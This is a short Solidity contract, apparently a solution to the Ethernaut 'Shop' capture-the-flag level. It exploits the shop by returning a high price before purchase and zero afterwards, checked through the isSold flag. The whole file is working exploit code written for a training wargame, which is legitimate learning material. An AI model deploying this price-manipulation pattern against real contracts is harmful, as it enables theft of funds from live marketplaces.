// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import { IShop } from "ethernaut/21-shop/IShop.sol";

contract ShopAttacker {
    function exploit(address _shopAddr) external {
        IShop(_shopAddr).buy();
    }

    function price() external view returns (uint256) {
        (bool success, bytes memory result) = msg.sender.staticcall(abi.encodeCall(IShop.isSold, ()));
        bool isSold = abi.decode(result, (bool));
        if (!isSold) return 200;
        return 0;
    }
}
